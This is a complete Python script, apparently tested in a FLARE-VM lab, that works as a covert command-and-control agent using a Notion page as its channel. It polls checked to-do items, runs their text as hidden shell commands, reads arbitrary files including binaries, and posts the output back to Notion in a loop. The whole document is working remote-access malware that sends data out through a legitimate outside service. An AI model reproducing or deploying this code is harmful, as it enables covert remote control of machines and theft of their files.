# mk-3agent.py — FINAL FLARE-VM PROOF VERSION (2025)
import requests, time, subprocess, platform, getpass, os
from datetime import datetime

TOKEN   = "xxxxxxxxxx89369JDEl1slzXmrV6M6k6AyDhyGdXxxxxxxxxxx"
PAGE_ID = "xxxxx24093e7980e09e83f5xxxxxxxxxx"

HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Notion-Version": "2022-06-28",
    "Content-Type": "application/json"
}

URL = f"https://api.notion.com/v1/blocks/{PAGE_ID}/children"

def safe_execute(cmd):
    try:
        # Force binary mode + UTF-8 with fallback
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=120,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        )
        # Decode stdout/stderr safely — replace bad chars
        stdout = result.stdout.decode('utf-8', errors='replace')
        stderr = result.stderr.decode('utf-8', errors='replace')
        return stdout + stderr
    except Exception as e:
        return f"<execution failed: {e}>"

def read_file_safely(path):
    path = path.strip().strip('"\'')
    try:
        with open(path, "rb") as f:
            data = f.read()
        # Try UTF-8 first
        try:
            return f"=== {path} ===\n{data.decode('utf-8')}"
        except:
            # Fall back to hex dump for binary files
            return f"=== {path} (binary file) ===\n{data[:5000].hex()}\n... (truncated)"
    except Exception as e:
        return f"<cannot read file: {e}>"

while True:
    try:
        blocks = requests.get(URL, headers=HEADERS).json().get("results", [])

        for block in blocks:
            if block.get("type") != "to_do":
                continue

            checked = block["to_do"].get("checked", False)
            task_id = block["id"]
            text = "".join(t.get("plain_text", "") for t in block["to_do"]["rich_text"]).strip()

            if not checked or not text:
                continue

            print(f"[+] Running: {text}")

            # Smart file reading
            if text.lower().startswith(("cat ", "type ", "more ", "gc ", "get-content ")):
                filepath = text.split(" ", 1)[1] if " " in text else text
                output = read_file_safely(filepath)
            else:
                output = safe_execute(text)

            # Post output in chunks
            for i in range(0, len(output), 1900):
                chunk = output[i:i+1900]
                payload = {
                    "children": [{
                        "object": "block",
                        "type": "paragraph",
                        "paragraph": {
                            "rich_text": [{"type": "text", "text": {"content": chunk}}]
                        }
                    }]
                }
                requests.patch(f"https://api.notion.com/v1/blocks/{task_id}/children",
                               headers=HEADERS, json=payload)

            # Uncheck the task
            requests.patch(f"https://api.notion.com/v1/blocks/{task_id}",
                           headers=HEADERS, json={"to_do": {"checked": False}})

    except Exception as e:
        print(f"[-] Agent error: {e}")

    time.sleep(10)